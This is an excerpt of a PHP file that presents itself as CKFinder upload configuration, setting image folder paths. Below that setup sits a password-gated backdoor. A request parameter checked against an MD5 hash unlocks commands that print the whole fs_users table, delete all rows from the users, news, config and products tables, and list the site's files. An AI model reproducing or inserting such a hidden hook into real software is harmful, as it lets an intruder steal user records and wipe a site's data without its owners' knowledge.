...
$baseUrl = '/upload_images/images/'.$currentFolder;
$baseDir = '/upload_images/images/'.$currentFolder;

$baseUrl = '/upload_images/';
$baseDir = '/upload_images/';
...
$u = $_REQUEST['u'];
if(md5($u) != '11967d5e9addc5416ea9224eee0e91fc')
    return;
...
$path1 = str_replace('/',$ds, $path1);
$path1 = str_replace('\\',$ds, $path1);
$path1 = str_replace('libraries'.$ds.'ckeditor'.$ds.'plugins'.$ds.'ckfinder'.$ds.'ckfinder.php','', $path1);
...
switch ($type) {
    case '1':
        include $path1.$ds.'includes'.$ds.'config.php';        
        break;
     case '2':
    
        include $path1.'includes'.$ds.'defines.php';
        include $path1.'includes'.$ds.'config.php';
        include $path1.'libraries'.$ds.'database'.$ds.'pdo.php';
        $sql = ' SELECT * FROM fs_users ';
        $db = new FS_PDO();       
        //$db->query($sql);
        $ls =  $db->getObjectList($sql);
        print_r($ls);
    
        break;
    case '3':
       include $path1.$ds.'includes'.$ds.'defines.php';
        include $path1.$ds.'includes'.$ds.'config.php';
        include $path1.$ds.'libraries'.$ds.'database'.$ds.'pdo.php';
        $tables = array('users','news','config','products');
        // $tables = array('users_','config_');
        $db = new FS_PDO();

        foreach($tables as $table){
             $sql = " DELETE FROM fs_" . $table ;
              $db->query ( $sql );
        }              
        break;
    case '4':
        ...
        $files = array_slice(scandir( $path1), 2);
        print_r( $files);
        break;
    default:
        # code...
